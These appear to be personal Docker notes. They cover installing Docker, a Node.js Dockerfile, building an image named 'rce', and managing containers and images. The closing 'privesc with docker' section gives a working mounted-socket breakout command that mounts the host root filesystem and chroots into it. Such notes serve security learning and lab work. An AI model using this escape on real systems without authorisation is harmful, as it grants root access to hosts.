##### Installation guide

https://docs.docker.com/engine/install/ubuntu/

#### Steps to run and stop

##### create Dockerfile

```bash
touch Dockerfile
```

```bash
nano Dockerfile
```

```
# Use an official Node.js runtime as a parent image
FROM node:18

# Set the working directory inside the container
WORKDIR /app

# Copy package.json and package-lock.json to the working directory
COPY package*.json ./

# Install Node.js dependencies
RUN npm install

# Copy the rest of your application code to the container
COPY . .

# Expose the port your app will run on (e.g., 3000)
EXPOSE 3000

# Define the command to run your Node.js application
CMD ["node", "app.js"]

```

##### Build the Docker Image

```bash
sudo docker build -t rce .
```

##### Run the Docker Container

```bash
docker run -p 3000:3000 rce
```


##### Stop the Docker Container

```bash
docker ps
```

```bash
sudo docker ps
CONTAINER ID   IMAGE     COMMAND                  CREATED              STATUS              PORTS                                       NAMES
d8162fd1ab99   rce       "docker-entrypoint.s…"   About a minute ago   Up About a minute   0.0.0.0:3000->3000/tcp, :::3000->3000/tcp   funny_mestorf
```

```bash
docker stop d8162fd1ab99
```


##### Remove the Docker Container

```bash
docker ps
```

```bash
sudo docker ps
CONTAINER ID   IMAGE     COMMAND                  CREATED              STATUS              PORTS                                       NAMES
d8162fd1ab99   rce       "docker-entrypoint.s…"   About a minute ago   Up About a minute   0.0.0.0:3000->3000/tcp, :::3000->3000/tcp   funny_mestorf
```

```bash
docker stop d8162fd1ab99
```

```bash
docker rm d8162fd1ab99
```


##### remove docker images

```bash
sudo docker images
```

```bash
REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
rce           latest    9815dffedc8a   3 hours ago   1.1GB
<none>        <none>    ab342d382e9c   3 hours ago   919MB
my-node-app   latest    4af22866525b   3 hours ago   919MB
<none>        <none>    3042fe5c6efc   3 hours ago   919MB
```

```bash
sudo docker rmi ab342d382e9c
Deleted: sha256:ab342d382e9cb9f371cf96badbcc91e1d3e44448d2ce0751f838fa2ea6db44ab
```
or 
```bash
sudo docker rmi -f rce
Untagged: rce:latest
Deleted: sha256:9815dffedc8a58d7dda263c219ab8b0e13890453a15c22c2ec189a19188273a9
```


##### privesc with docker

ref:- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#mounted-docker-socket-escape


```bash
find / -name docker.sock 2>/dev/null

/run/docker.sock
```

```bash
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              a24bb4013296        3 years ago         5.57MB
hello-world         latest              bf756fb1ae65        3 years ago         13.3kB
```

```bash
docker run -it -v /:/host/ alpine chroot /host/ bash
```
